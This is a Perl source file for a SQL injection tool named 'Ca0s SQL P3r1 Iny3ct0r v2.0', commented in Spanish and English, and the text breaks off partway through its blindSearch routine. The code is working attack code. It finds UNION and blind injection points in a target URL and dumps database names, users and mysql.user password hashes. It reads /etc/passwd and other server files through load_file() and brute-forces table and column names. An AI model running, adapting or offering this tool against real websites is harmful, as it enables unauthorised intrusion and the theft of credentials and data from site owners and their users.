#!/usr/bin/perl

use Switch;
use LWP::UserAgent;

#	Ca0s SQL P3r1 Iny3ct0r v2.0 				## 	Ca0s SQL P3r1 Iny3ct0r v2.0
#	Coded by Ca0s { c40s[at]hotmail[dot]es }		## 	Programado por Ca0s { c40s[at]hotmail[dot]es
#	gr33tz to #RE & DDLR & EvilZone				##	Pasate por #RemoteExecution & DiosDeLaRed & EvilZone
#					        gr33tz a descendents por sus ideas

#	Changes from v1 to v1.5:				##	Cambios de la v1 a la v1.5:
#		- Some bugs fixed				##		- Arreglados algunos fallos
#		- Added brute forcing				##		- Añadida fuerza bruta
#		- Mysql.user check and extraction		##		- Extrae mysql.user
#		- Database and Username extraction		##		- Extrae los nombres de las bases de datos y el usuario
#		- Test load_file()				##		- Prueba load_file()
#	Changes from v1.5 to v2.0:				##	Cambios de v1.5 a v2.0:
#		- Added BLIND SQli attack			## 		- Inyección SQL a ciegas (Blind SQLi)
#		- Added Brute Blind SQLi attack			##		- Inyección SQL a ciegas por fuerza bruta
#		- Added more error detection options		##		- Mas modos de detectar cuando la inyeccion es exitosa
#		- Proxy support					##		- Soporte para proxy
#		- unhex(hex())					##		- unhex(hex())
#		- Added -- inyection end option			##		- Añadida la opcion de terminar las inyecciones con --
#		- Fixed moore bugs				##		- Mas errores arreglados

#	You will probably find some bugs and silly code 	##	Es posible que encuentres fallos en la herramienta. En el codigo puedes
#	and comments in the code (debugging shit...)		##	encontrar comentarios absurdos y codigo comentado (debugueando...)

$sch="0x636130735f76";

@instrucciones[0]="[/\\/\\/] | Perl SQL Inyector v1.5 <----> By Ca0s {Alias sh0k!} | [\\/\\/\\]\n";
@instrucciones[1]="-----------------------------------------------------------------------\n  Gr33tz: | #RemoteExecution | DiosDeLaRed | EvilZone |\n\t\t{ st4ck-3rr0r.blogspot.com }\n";
@instrucciones[2]=" <|-> Usage: perl ".$0."[TARGET] [-comment] [-f] [-b] [-good 'text']|[-bad 'text']    <-|>\n\n\t[TARGET] URL to attack, ex: [url]http://www.example.com/vuln.php?id=2\n\t\t[/url][-comment] - End injections with --\n\t- Attack modes: -\n\t  If none, it attacks information_schema. -f y -b can be used at same time for Blind SQLi brute-forcing tables/columns.\n\t\t[-f] -> Brute force tables/columnsa\n\t\t[-b] -> Blind SQli\n\t- Blind SQLi error detection: -\n\t  If none, it compares number of lines.\n\t  -good and -bad can't be used same time.\n\t\t[-bad 'text'] -> Some HTML which appears when MySQL Error\n\t\t[-good 'text'] -> Some HTML which appears when no error\n\n";
@instrucciones[3]=" <|>->->->->->->->Ca0s {st4ck-3rr0r.blogspot.com}// c40s[at]hotmail[dot]es \t\t \t\t\t                        <-|>\n\n";
$target=$ARGV[0] || die("\n"."@instrucciones");
if($target!~/^http:\/\//) 
{
	if($target!~/^https:\/\//) { $target="http://".$target; }
}
print "\n".@instrucciones[0].$instrucciones[1];
print "\n[+] Objetivo: ".$target."\n";
$pGood="";
$pBad="";
$ar=0;
$nArgs=@ARGV;
for($i=0; $i<=$nArgs; $i++)
{
	$arg=$ARGV[$i];
	if($arg eq "-f") { $bruteDef=1; }
	#if($arg eq "-s") { $skip=1; }
	if($arg eq "-b") { $blindDef=1; }
	if($arg eq "-good") { $pGood=$ARGV[$i+1]; }
	if($arg eq "-bad") { $pBad=$ARGV[$i+1]; }
	if($arg eq "-proxy") { $proxy=$ARGV[$i+1]; }
	if($arg eq "-comment") { 
		$myComment=$ARGV[$i+1];
		$comment=1; 
	}
}
if($proxy ne "")
{
	print "[+] Usando Proxy: $proxy\n";
	$ip=get("http://st4ck-3rr0r.webcindario.com/ip.php");
	print "[+] Tu ip actual: $ip\n";
	
}
if($bruteDef==1) { print "[+] Fuerza bruta activada... be patient my friend :-)\n"; }
else { $bruteDef=0; }
if($skip==1)
{
	print "[-] Saltando comprobaciones...\n";
	$code=get($ARGV[0]);
}
else
{
	if(!($code=get($ARGV[0]))) 
	{
		error(1);
		exit(0);
	}
}
$customPat=0;
if(($pGood ne "") & ($pBad ne ""))
{
	print "@instrucciones[2]@instrucciones[3]";
	exit(0);
}
if($pGood ne "")
{
	print "[+] Usando '$pGood' para detectar cuando la inyeccion da positivo.\n";
	$customPat=1;
}
if($pBad ne "")
{
	print "[+] Usando '$pBad' para detectar cuando la inyeccion da negativo.\n";
	$customPat=1;
}
if($blindDef==1)
{
	blindStart(); 
	exit;
}

$code1=scalar(split("\n", get($target." AND 1=2")));

if(!$skip)
{
	$html1=get($target."+AND+1=1");
	$html2=get($target."+AND+1=2");
	if($customPat==1)
	{
		if(($pGood ne "")&($html1=~/$pGood/)&($html2=~/$pGood/)) { 
			error(2);
			exit(0);
		}
		if(($pBad ne "")&($html1=~/$pBad/)&($html2=~/$pBad/)) { 
			error(2);
			exit(0);
		}
	}
	else {
		if($code1==$code)
		{
			error(2);
			exit(0);
		}
	}
}

$done1=0;
$asd=get($ARGV[0]."AND+1=2");
$inyx="+AND+1=2+union+select+1";
$n=2;
$l1=scalar(split("\n", $asd));
$web=get($ARGV[0].$inyx);
$l2=scalar(split("\n", $web));
if( ($l1!=$l2) || ( ($customPat==1) & ( (($pGood ne "")&($web=~/$pGood/)) || (($pBad ne "")&(($web=~/$pBad/)) )))) 
{ 
	$done1=1; 
	$pars=1;
	$inyeccion=$ARGV[0]."+AND+1=2+UNION+SELECT+concat($sch, 1, $sch)";
	if($comment==1) {$inyeccion.=$myComment; }
	print "[+] URL:\n  --  $ARGV[0]+AND+1=2+UNION+SELECT+1\n";
}
while($done1==0)
{
	$inyx=$inyx.",".$n;
	$atk=$ARGV[0].$inyx;
	if($comment==1) { $atk.=$myComment; }
	$web=get($atk);

	if($customPat==1)
	{
		if((($pGood ne "")&($web=~/$pGood/))||(($pBad ne "")&(!($web=~/$pBad/))))
		{
			$pars=$n+1;
			print "[+] Numero de parametros: ".$pars."\n";
			$inyeccion=$ARGV[0]."+AND+1=2+UNION+SELECT+concat(".$sch.",1,".$sch.")";
			for($c=2; $c<=$pars; $c++)
			{
					$inyeccion.=",concat(".$sch.",".$c.",".$sch.")";
			}
			if($comment==1) { $inyeccion.=$myComment; }
			print "[+] URL:\n  -- ".$atk."\n";
			$done1=1;
		}	
	}
	else
	{
		$l2=scalar(split("\n", $web));
		if($l1!=$l2)
		{
			$pars=$n;
			print "[+] Numero de parametros: ".$pars."\n";
			$inyeccion=$ARGV[0]."+AND+1=2+UNION+SELECT+concat(".$sch.",1,".$sch.")";
			for($c=2; $c<=$pars; $c++)
			{
					$inyeccion.=",concat(".$sch.",".$c.",".$sch.")";
			}
			if($comment==1) { $inyeccion.=$myComment; }
			print "[+] URL:\n  -- ".$atk."\n";
			$done1=1;
		}
	}
	$n=$n+1;
}

#	$pars -> numero de valores

print "[+] Valores que imprimen: ";
@vars;
$web=get($inyeccion);
$t;
for($t=1; $t<=$pars; $t++)
{
	$val="ca0s_v".$t."ca0s_v";
	if(get($inyeccion)=~/$val/)
	{
		push(@vars, "$t");
	}
}
if (@vars==0)
{
	error(3);
	exit(0);
}
else
{
	print "@vars"."\n";
}
$print= "@vars[0]";
$ca0s_is="char(99,97,48,115,95,105,115,95)";
$ca0s_is2="char(99,97,48,115,95,105,115,50,95)";

print "[+] Base de datos actual: ";
$iny=makeIny($print, $pars, "concat($ca0s_is, unhex(hex(database())), $ca0s_is2)");
if($comment==1) { $iny.=$myComment; }
$web=get($ARGV[0].$iny);
$dbName=getData($web);
print $dbName."\n";

print "[+] Bases de datos en el servidor:";
$n=0;
$dbN="s0m3th1n6";
@schemaDbs;
while($dbN ne "")
{
	$iny=makeIny($print, $pars, "concat($ca0s_is, unhex(hex(schema_name)), $ca0s_is2)");
	$iny.="+FROM+information_schema.schemata+limit+$n,1";
	if($comment==1) { $iny.=$myComment; }
	$web=get($ARGV[0].$iny);
	$dbN=getData($web);
	if($dbN ne "") 
	{
		print "\n  --  $dbN"; 
		push(@schemaDbs, "$dbN");
	}
	$n++;
}

print "\n[+] Usuario actual: ";
$iny=makeIny($print, $pars, "concat($ca0s_is, user(), $ca0s_is2)");
if($comment==1) { $iny.=$myComment; }
$web=get($ARGV[0].$iny);
$uName=getData($web);
print $uName."\n";

print "[+] Probando load_file(): ";
$iny=makeIny($print,$pars, "concat($ca0s_is, load_file(0x2f6574632f706173737764), $ca0s_is2)");
if($comment==1) { $iny.=$myComment; }
$web=get($ARGV[0].$iny);
if(($web=~/root:/)&($web=~/ca0s_is/))
{
	$pas=0;
	while($pas==0)
	{
		print "  ! -> load_file disponible, guardar /etc/passwd ? (S/N) ";
		$res=<STDIN>;
		lc(chop($res));
		if(($res=="s")||($res=="n")) { $pas=1; }
	}
	if($res eq "s")
	{
		$etcpasswd=getData($web);
		print "  --  Nombre de archivo a guardar: ";
		$fname=<STDIN>;
		chop($fname);
		open(fEP, ">$fname");
		print fEP $etcpasswd;
		close(fEP);
		print "  --  Guardado :-)\n";
	}
	$pass=0;
	$res="s";
	while($res eq "s")
	{
		
		$pas=0;
		while($pas==0)
		{
			print "[/] Cargar otro archivo con load_file ? (S/N) ";
			$res=<STDIN>;
			lc(chop($res));
			if(($res=="s")||($res=="n")) { $pas=1; }
		}
		if($res eq "s")
		{
			print "  --  Archivo a cargar: ";
			$fName=<STDIN>;
			chop($fName);
			$hFName=text2hex($fName);
			$iny=makeIny($print, $pars, "concat($ca0s_is, load_file($hFName), $ca0s_is2)");
			if($comment==1) { $iny.=$myComment; }
			$web=get($ARGV[0].$iny);
			if($web=~/ca0s_is/)
			{
				$fConts=getData($web);
				print "\n  -- ! El archivo pudo cargarse, guardar en: ";
				$fSave=<STDIN>;
				chop($fSave);
				open(fS, ">$fSave");
				print fS $fConts;
				close fS;
				print "\n  --  Archivo guardado.\n";
			}
			else { print "\n  --  No pudo cargarse el archivo.\n"; }
		}
	}
} 
else { print "\n  [-] load_file no disponible.\n"; }

print "[+] Probando mysql.user...";
$iny=makeIny($print, $pars, "concat($ca0s_is,count(User),$ca0s_is2)");
$iny.="+FROM+mysql.user";
if($comment==1) { $iny.=$myComment; }
$web=get($ARGV[0].$iny);
if($web=~/ca0s_is/)
{
	print "\n[+] Mysql.Users disponible, extrayendo...\n";
	@res=split("ca0s_is_", $web);
	@res2=split("ca0s_is2_", @res[1]);
	$nu=@res2[0];
	print "  -- Numero de usuarios: $nu\n";
	for($p=0; $p<$nu; $p++)
	{
		$iny=makeIny($print, $pars, "concat($ca0s_is,concat(unhex(hex(User)), 0x3a, unhex(hex(Password))),$ca0s_is2)")."+FROM+mysql.user+LIMIT+$p,1";
		if($comment==1) { $iny.=$myComment; }
		$web=get($ARGV[0].$iny);
		@res=split("ca0s_is_", $web);
		@res2=split("ca0s_is2_", @res[1]);
		$daTa=@res2[0];
		@Data=split(":", $daTa);
		print "  ! -> Usuario encontrado: @Data[0] : @Data[1]\n";
	}	
}
else { print "\n  [-] Mysql.Users no disponibe.\n"; }

print "[+] Probando information_schema...";
$iny=" AND+1=2+UNION+SELECT+";
$iny=makeIny($print, $pars, "concat(".$ca0s_is.", count(*), ".$ca0s_is2.") ");
$iny.="+FROM+information_schema.tables";
if($comment==1) { $iny.=$myComment; }
$target=$ARGV[0];
$inyparsed=get($ARGV[0].$iny);
if((index($inyparsed, "ca0s_is_")!=-1)&($bruteDef==0))
{
	print " Information_Schema disponible, extrayendo nombre de tablas.\n";
}
else
{
	print " Information_Schema no disponible, probando fuerza bruta...\n";
	$iny="+AND+1=2+UNION+SELECT+";
	if("@vars[0]"==1)
	{
		$iny.="0x636130735f7363616e6e65725f7461626c655f666f756e64";
	}
	else
	{
		$iny.="1";
	}
	for($c=2; $c<=$pars; $c++)
	{
		if($c=="@vars[0]")
		{
			$iny.=", 0x636130735f7363616e6e65725f7461626c655f666f756e64 ";
		}
		else
		{
		$iny.=",".$c;
		}
	}
	bruteStart($ARGV[0].$iny, "@vars[0]", $pars);
}
@res1=split("ca0s_is_", $inyparsed);
@res2=split("ca0s_is2_", @res1[1]);
$ntables=@res2[0];
print "  -- Numero de tablas: ".$ntables."\n";

@tname;
@tdbase;

# asdasd ooold

$numDbs=@schemaDbs;
for($n=0; $n<$numDbs; $n++)
{
	$dbName="@schemaDbs[$n]";
	$iny=makeIny($print, $pars, "concat(".$ca0s_is.", count(table_name), ".$ca0s_is2.") ");
	$iny.="+FROM+information_schema.tables+WHERE+TABLE_SCHEMA=".text2hex($dbName);
	if($comment==1) { $iny.=$myComment; }
	$codet=get($ARGV[0].$iny);
	@res1=split("ca0s_is_", $codet);
	@res2=split("ca0s_is2_", @res1[1]);
	$numTablesInDb=@res2[0];

	for($a=0; $a<$numTablesInDb; $a++)
	{
		$iny=makeIny($print, $pars, "concat(".$ca0s_is.", unhex(hex(table_name)), ".$ca0s_is2.") ");
		$iny.="+FROM+information_schema.tables+WHERE+TABLE_SCHEMA=".text2hex($dbName)."+LIMIT+$a,1";
		if($comment==1) { $iny.=$myComment; }		

		$codet=get($ARGV[0].$iny);
		@res1=split("ca0s_is_", $codet);
		@res2=split("ca0s_is2_", @res1[1]);
		$tname=@res2[0];
		push(@tname, "$tname");
		push(@tdbase, "$dbName");
	}
	
}


print "  -- Tablas extraidas:\n";
$r2="s";
while($r2 eq "s")
{
	$rest="n";
	while($rest eq "n")
	{
		for($x=0; $x<=$ntables-1; $x++)
		{
			print "\n".($x+1)."\t".@tname[$x];
		}
		$pasa=0;
		while($pasa==0)
		{
			print "\n\n[+] Introduce el numero de tabla para extraer sus datos (CTRL+Z para salir)>> ";
			$tnum=<STDIN>;
			chop($tnum);
			if(($tnum>0)&&($tnum<=@tname)) { $pasa=1; }
		}
		$tn2=$tnum-1;
		$tname="@tname[$tn2]";
		$hexTname=text2hex($tname);
		$tnameSchema="@tdbase[$tn2]";
		$hexTnameSchema=text2hex($tnameSchema);
		print "\n  -- Tabla-> ".$tnameSchema.".".$tname;		

		@columnas="";	# Forma guarra de limpiar
		pop(@columnas);	# el array T.T

		$iny=makeIny($print, $pars, "concat(".$ca0s_is.", count(*), ".$ca0s_is2.") ");
		$iny.="+FROM+information_schema.columns+WHERE+table_name=".$hexTname."+AND+TABLE_SCHEMA=".$hexTnameSchema;
		if($comment==1) { $iny.=$myComment; }
		$codec=get($ARGV[0].$iny);
		@res1=split("ca0s_is_", $codec);
		@res2=split("ca0s_is2_", @res1[1]);
		$cnum=@res2[0];
		print "\n  -- Numero de columnas-> ".$cnum."\n";
		for($cn=0; $cn<=$cnum; $cn++)
		{
			$iny=makeIny($print, $pars, "concat(".$ca0s_is.", unhex(hex(column_name)), ".$ca0s_is2.") ");
			$iny.="+FROM+information_schema.columns+WHERE+table_name=".$hexTname."+AND+TABLE_SCHEMA=".$hexTnameSchema;
			$iny.="+limit+".$cn.",1";
			if($comment==1) { $iny.=$myComment; }
			$colscode=get($ARGV[0].$iny);
			@res1=split("ca0s_is_", $colscode);
			@res2=split("ca0s_is2_", @res1[1]);
			$colname=@res2[0];
			push(@columnas, "$colname");
		}
		
		print "  -- Columnas:\n";
		for($b=0; $b<$cnum; $b++)
		{
			print "    -- ".@columnas[$b]."\n";
		}
		
		$iny=makeIny($print, $pars, "concat(".$ca0s_is.", count(*), ".$ca0s_is2.") ");
		$iny.="+FROM+".$tnameSchema.".".$tname;
		if($comment==1) { $iny.=$myComment; }
		$codenr=get($ARGV[0].$iny);
		@res1=split("ca0s_is_", $codenr);
		@res2=split("ca0s_is2_", @res1[1]);
		$nrows=@res2[0];
		print "  -- Rows: ".$nrows;
		print "\n\n[/] Extraer datos de la tabla? (S/N) --> ";
		$rest=<STDIN>;
		lc(chop($rest));
	}
	
	@data;
	print "\n[+] Extrayendo datos de la tabla ".$tname."...\n";
	print "\n[*] Formato: [columna](fila) -> dato\n";
	for($dr=0; $dr<=$nrows-1; $dr++)
	{
		
		for($dc=0; $dc<=$cnum-1; $dc++)
		{
			$iny=makeIny($print, $pars, "concat(".$ca0s_is.",unhex(hex(@columnas[$dc])) , ".$ca0s_is2.") ");
			$iny.=" FROM ".$tnameSchema.".".$tname." limit ".$dr.",1";	
			if($comment==1) { $iny.=$myComment; }
			$codedata=get($ARGV[0].$iny);
			@res1=split("ca0s_is_", $codedata);
			@res2=split("ca0s_is2_", @res1[1]);
			$data=@res2[0];
			
			print "\n[".@columnas[$dc]."](".$dr.") -> ".$data;
			$texto.=$data."\t\t";
		}
		print "\n\n-------------------------------\n\n";
		$texto.="\n";
	}
	print "\n[/] Guardar tabla en archivo de texto? (S/N) ";
	$rest1= <STDIN>;
	lc(chomp($rest1));
	
	if($rest1 eq "s")
	{
		print "\n  -- Nombre de archivo: ";
		$tpath= <STDIN>;
		chop($stdin);
		$header="";
		for($h=0; $h<=@columnas; $h++)
		{
			$header.=@columnas[$h]."\t\t";
		}
		$header.="\n\n";
		open(FILEtxt,">$tpath");
		print FILEtxt "$header";
		close(FILEtxt);
		open(FILEtxt, ">>$tpath");
		print FILEtxt "$texto";
		close(FILEtxt);
		print "\n[+] Guardado en $tpath";
	}
	
	print "[*] Extraer otra tabla? (S/N)";
	$rest1=$rest="";
	$r2=<STDIN>;
	lc(chop($r2));
}
print "\n[+] Finalizado.\n";
print "\n@instrucciones[3]";

#------Funciones-----------------------------------------------------

sub bruteStart
{
	setLists();
	$url=shift;
	$print=shift;
	$pars=shift;
	print "Atacando: $url\n";
	$n=@myTables;
	print "Probando $n nombres de tablas...\n\n";
	@brutedTables;
	for($i=0; $i<$n; $i++)
	{
		$batTb=$url."+FROM+@myTables[$i]";
		if($comment==1) { $batTb.=$myComment; }
		$test=get($batTb);
		if($test=~/ca0s_scanner_table_found/)
		{
			print "[!] Tabla encontrada: \"@myTables[$i]\" :-)\n";
			push(@brutedTables, "@myTables[$i]");
		}
		else
		{
			if(($i%10)==0) { print "  - Probados $i / ".@myTables."\n"; }
		}
	}
	if(@brutedTables!=0)
	{
		$res="s";
		while($res eq "s")
		{
			print "\n[+] Tablas encontradas: \n";
			for($m=0; $m<@brutedTables; $m++)
			{
				print "  ".($m+1)."  --  @brutedTables[$m]\n";
			}
			$pasa=0;
			while($pasa==0)
			{
				print "\n[*] Selecciona una tabla para brutear columnas: (introduce numero) ";
				$chTable=<STDIN>;
				chop($chTable);
				if(($chTable>0)&($chTable<=@brutedTables)) { $pasa=1; }
			}
			$chTableName="@brutedTables[$chTable-1]";
			print "[+] Tabla elegida: $chTableName.\n\n";
			$cl=0;
			foreach(@myColumns)
			{	
				$iny=makeIny($print, $pars, "concat(@myColumns[$cl], 0x636130735f7363616e6e65725f7461626c655f666f756e64)");
				$iny.="+FROM+$chTableName";
				if($comment==1) { $iny.=$myComment; }
				$cCode=get($ARGV[0].$iny);
				@brutedCols;
				if($cCode=~/ca0s_scanner_table_found/)
				{
					push(@brutedCols, @myColumns[$cl]);
					print "[!] Columna encontrada: \"@myColumns[$cl]\"\n";
				}
				else { if(($cl%10)==0) { print "  - Probados $cl / ".@myColumns."\n"; } }
				$cl++;
			}
			print "\n[+] Columnas encontradas en < $chTableName > :\n";
			for($cn=0; $cn<@brutedCols; $cn++)
			{	
				print "  --  @brutedCols[$cn]\n";
			}
			print "\nExtraer datos de la tabla (con las columnas encontradas) ? (S/N)";
			$r1=<STDIN>;
			chop($r1);
			$cnum=@brutedCols;
			if(lc($r1) eq "s")
			{
				$iny=makeIny($print, $pars, "concat(".$ca0s_is.", count(*), ".$ca0s_is2.")");
				$iny.="+FROM+$chTableName";
				if($comment==1) { $iny.=$myComment; }
				$codenr=get($ARGV[0].$iny);
				@res1=split("ca0s_is_", $codenr);
				@res2=split("ca0s_is2_", @res1[1]);
				$nrows=@res2[0];
				print "  -- Rows: ".$nrows."\n";

				for($dr=0; $dr<=$nrows-1; $dr++)
				{
					
					for($dc=0; $dc<=$cnum-1; $dc++)
					{
						$iny="+AND+1=2+UNION+SELECT+";
						if($print==1) { $iny.="concat(".$ca0s_is.",unhex(hex(@brutedCols[$dc])) , ".$ca0s_is2.") "; }
							else { $iny.="1"; }
						for($di=2; $di<=$pars; $di++)
						{
							if($di==$print)
							{
								$iny.=",concat(".$ca0s_is.",unhex(hex(@brutedCols[$dc])) , ".$ca0s_is2.") ";
							}
							else
							{
								$iny.=",".$di;
							}
						}
						$iny.=" FROM ".$chTableName." limit ".$dr.",1";	
						if($comment==1) { $iny.=$myComment; }
						$codedata=get($ARGV[0].$iny);
						@res1=split("ca0s_is_", $codedata);
						@res2=split("ca0s_is2_", @res1[1]);
						$data=@res2[0];
						
						print "\n[".@brutedCols[$dc]."](".$dr.") -> ".$data;
						$texto.=$data."\t\t";
					}
					print "\n\n-------------------------------\n\n";
					$texto.="\n";
				}
				print "[/] Guardar tabla en archivo de texto? (S/N) ";
				$r2=<STDIN>;	
				lc(chop($r2));
				if($r2 eq "s")
				{
					print "\n  -- Nombre de archivo: ";
					$tpath= <STDIN>;
					chop($stdin);
					$header="";
					for($h=0; $h<=@brutedCols; $h++)
					{
						$header.=@brutedCols[$h]."\t\t";
					}
					$header.="\n\n";
					open(FILEtxt,">$tpath");
					print FILEtxt "$header";
					close(FILEtxt);
					open(FILEtxt, ">>$tpath");
					print FILEtxt "$texto";
					close(FILEtxt);
					print "\n[+] Guardado en $tpath";
				}
			}
			print "\n[/]Brutear otra tabla? (S/N) ";
			$res=<STDIN>;
			lc(chop($res));
		}	
	}
	else
	{
		print "[-] No se encontraron tablas...\n";
	}
	print "\n[+] Finalizado\n";
	print "\n@instrucciones[3]";
	exit;
}

sub blindStart()
{
	print "[+] Probando inyeccion a ciegas... mas vale que te sobre el tiempo\n";
	$r1=get($ARGV[0]."+AND+1=1");
	$r2=get($ARGV[0]."+AND+1=2");
	if(($r1 eq $r2)&&($skip!=1))
	{
		print "[-] No es vulnerable.\n";
		print "\n@instrucciones[3]";
		exit;
	}
	print "[+] El objetivo es vulnerable ;-)\n";
	print "[+] Extrayendo algunos datos...\n";

	print "\t--Version SQL: ";
	$version=blindSearch("version()");
	print "$version\b\n";

	print "\t--Database:";
	$cDB=blindSearch("database()");
	$hexcDB=text2hex($cDB);
	print "$cDB\b\n";
	if($bruteDef!=1)
	{	
		print "[+] Extrayendo tablas del information_schema: ";
	
		print "\n\t--Numero de tablas: ";
		$n_tablas=blindSearch("(select+count(table_name)+from+information_schema.tables)");
		$n_tablas--;
		if(($n_tablas<0)|($bruteDef==1))
		{
			print "\n[-] information_schema no disponible, probando fuerza bruta...\n";	
			bruteBlind();
		}
		print $n_tablas+1;
		print "\b\b\n\n";
	}
	else { bruteBlind(); }
	$bExit=0;
	while($bExit!=1)
	{
		if($exALL==1)
		{
			for($ggg=0; $ggg!=@blindTables; $ggg++)
			{
				print "\t$ggg -- @blindTables[$ggg]\n";
			}
		} 
		
		do {
			print "[/] Intruduce un numero de tabla (0-$n_tablas) para extraer sus datos (ALL para extraer los nombres de todas todas - mucha paciencia) -> ";
			$ex=<STDIN>;
			chop($ex);
			if(lc($ex) eq "all") { $exAll=1; }
		}
		while((($ex<0)||($ex>$n_tablas))||(!($ex=~/^-?\d/)&($exAll!=1)));
			
		@blindTables;
		if(lc($ex) eq "all")
		{
			$exALL=1;
			for($h=0; $h<=$n_tablas; $h++)
			{
				print "\t$h --";
				$t_name=blindSearch("(select+table_name+from+information_schema.tables+limit+$h,1)");
				push(@blindTables, $t_name);
				print "$t_name\n";
			}

			do {
				print "[/] Intruduce un numero de tabla (0-$n_tablas) para extraer sus datos -> ";
				$ex=<STDIN>;
				chop($ex);
			}
			while(($ex<0)||($ex>$n_tablas));

		}

		print "\t-- Tabla:  ";
		$t_name=blindSearch("(select+table_name+from+information_schema.tables+limit+$ex,1)");
		$t_name_hex=text2hex($t_name);
		$t_name_ord=ordstring($t_name);
		print "$t_name\t--Pertenece a la DB: ";
		$t_DB=blindSearch("(select+table_schema+from+information_schema.tables+where+table_name=$t_name_hex+limit+0,1)");
		$t_DB_hex=text2hex($t_DB);
		print "$t_DB\t--Numero de columnas:  ";
		$n_cols=blindSearch("(SELECT+count(column_name)+FROM+information_schema.columns+WHERE+table_name=$t_name_hex+AND+TABLE_SCHEMA=$t_DB_hex)");
		print "$n_cols\t--Rows: ";
		$n_rows=blindSearch("(select+count(*)+from+$t_DB.$t_name)");
		print "$n_rows";

		$eRes="";
		while(($eRes ne "s") & ($eRes ne "n"))
		{
			print "\n[/] Extraer columnas? (S/N) ";
			$eRes=<STDIN>;
			chop($eRes);
			if(lc($eRes) eq "s")
			{
				@blindColumns="";
				pop(@blindColumns);
				for($cbc=0; $cbc<$n_cols; $cbc++)
				{
					# $data=blindSearch("(select+@brutedBlindCols[$bfd]+FROM+@brutedBlindTables[$nTable]+limit+$nBT,1)");
					$blindCol=blindSearch("(SELECT+column_name+FROM+information_schema.columns+WHERE+table_name=$t_name_hex+AND+TABLE_SCHEMA=$t_DB_hex+LIMIT+$cbc,1)");
					print "\t--$blindCol\n";
					push(@blindColumns, "$blindCol");
				}
			}
		}		
			
		$currentRow=0;

		while((lc($eRes) eq "s")&($currentRow<$n_rows))
		{
			print "\n[/] Extraer fila? (S/N) ";
			$eRes=<STDIN>;
			chop($eRes);
			if(lc($eRes) eq "s")
			{
				print "[-] Fila: ".($currentRow+1)."/$n_rows\n";
				for($bec=0; $bec<$n_cols; $bec++)
				{
					$ceCName="@blindColumns[$bec]";
					$ceData=blindSearch("(SELECT+$ceCName+FROM+$t_DB.$t_name+LIMIT+$currentRow,1)");
					print "\t[$ceCName]\t$ceData\n";
				}
				$currentRow++;
			}
		}

		$bRes="";
		while(($bRes ne "s") & ($bRes ne "n"))
		{
			print "\n[/] Extraer otra tabla? (S/N) ";
			$bRes=<STDIN>;
			chop($bRes);
			if(lc($bRes) eq "s")
			{
				$bExit=0;
			}
			if(lc($bRes) eq "n")
			{
				$bExit=1;
			}
		}
	}
	print "\n@instrucciones[3]";
}

sub bruteBlind
{
	print "[+] Buscando tablas...\n";
	setLists();
	@brutedBlindTables;
	$nFound=0;
	$original=get($ARGV[0]."+AND+1=1");
	$lOriginal=scalar(split("\n", $original));
	for($bf=0; $bf<=@myTables; $bf++)
	{
		$atk="+and+(select+count(*)+from+@myTables[$bf])";
		if($comment==1) { $atk.=$myComment; }
		$try=get($ARGV[0].$atk);
		$lTry=scalar(split("\n", $try));
		#print "\n$atk";

		if($customPat==1)
		{
			if(($pGood ne "")&($original=~/$pGood/)&($try=~/$pGood/)) 
			{ 
				push(@brutedBlindTables, "@myTables[$bf]");
				#print "   $nFound --@myTables[$bf]\n";
				$nFound++;			
			}
			if(($pBad ne "")&(!($original=~/$pBad/))&(!($try=~/$pBad/))) 
			{ 
				push(@brutedBlindTables, "@myTables[$bf]");
				#print "   $nFound --@myTables[$bf]\n";
				$nFound++;			
			}
		}
		elsif($lOriginal==$lTry)
		{
			push(@brutedBlindTables, "@myTables[$bf]");
			#print "   $nFound --@myTables[$bf]\n";
			$nFound++;
		}
	}

	$lastRes="s";
	while($lastRes eq "s")
	{
		for($bfrNum=0; $bfrNum<@brutedBlindTables; $bfrNum++)
		{
			print "    $bfrNum --@brutedBlindTables[$bfrNum]\n";
		}

		do {
			print "[/] Tabla para brutear columnas (0-".(@brutedBlindTables-1).") -> ";
			$nTable=<STDIN>;
			chop($nTable);
		}
		while(($nTable<0)||($nTable>(@brutedBlindTables-1)));

		@brutedBlindCols="";
		pop(@brutedBlindCols);

		for($bf=0; $bf<=@myColumns; $bf++)
		{
			$atk="+and+(select+count(@myColumns[$bf])+from+@brutedBlindTables[$nTable])";
			if($comment==1) { $atk.=$myComment; }
			$atk2="+AND+1=1";
			if($comment==1) { $atk2.=$myComment; }
			$original=get($ARGV[0].$atk2);
			$try=get($ARGV[0].$atk);
			if($customPat==1)
			{
				if(($pGood ne "")&($original=~/$pGood/)&($try=~/$pGood/)) 
				{ 
					push(@brutedBlindCols, @myColumns[$bf]);
					print "    -- @myColumns[$bf]\n";			
				}
				if(($pBad ne "")&(!($original=~/$pBad/))&(!($try=~/$pBad/))) 
				{ 
					push(@brutedBlindCols, @myColumns[$bf]);
					print "    -- @myColumns[$bf]\n";		
				}			
			}
			elsif(scalar(split("\n", $try))==scalar(split("\n", $original)))
			{
				push(@brutedBlindCols, @myColumns[$bf]);
				print "    -- @myColumns[$bf]\n";
			}
		}
		if(@brutedBlindCols==0)
		{
			print "No se encontraron columnas...";
		}
		$nbfRows=blindSearch("(select+count(@brutedBlindCols[0])+from+@brutedBlindTables[$nTable])");
		print "\t-- Filas: $nbfRows\n";
		do {
			print "[/] Extraer datos? (pregunto cada fila) (S/N) ";
			$asdRes=<STDIN>;
			chop($asdRes);
		}
		while(($asdRes ne "s") & ($asdRes ne "n"));
		if(lc($asdRes) eq "s")
		{
			$bRes="";
			$nBT=0;
			$bfExit=0;
			while(($bRes ne "s") & ($bRes ne "n") & ($bfExit==0) & ($nBT<$nbfRows))
			{
				print "\n[/] Extraer otra fila? (S/N) ";
				$bRes=<STDIN>;
				chop($bRes);
				if(lc($bRes) eq "s")
				{
					print "Fila -> ".($nBT+1)." / $nbfRows\n";
					$bfExit=0;
					for($bfd=0; $bfd<@brutedBlindCols; $bfd++)
					{
						$data=blindSearch("(select+@brutedBlindCols[$bfd]+from+@brutedBlindTables[$nTable]+limit+$nBT,1)");
						print "\tColumna: @brutedBlindCols[$bfd]\t\tValor: $data\n";
					}
					$nBT++;
					$bRes="";
					$bfExit=0;
				}
				elsif(lc($bRes) eq "n")
				{
					$bfExit=1;
				}
			}
		}
	
		$lastRes="";
		while(($lastRes ne "s") & ($lastRes ne "n"))
		{
			print "[/] Extraer otra tabla? (S/N) ";
			$lastRes=<STDIN>;
			chop($lastRes);
		}
	}	

	print "\n@instrucciones[3]";
	exit(0);
}

sub blindSearch
{
	$search=shift;
	$bDone=0;
	$n=0;
	$original=get($ARGV[0]);
	while($bDone==0)
	{
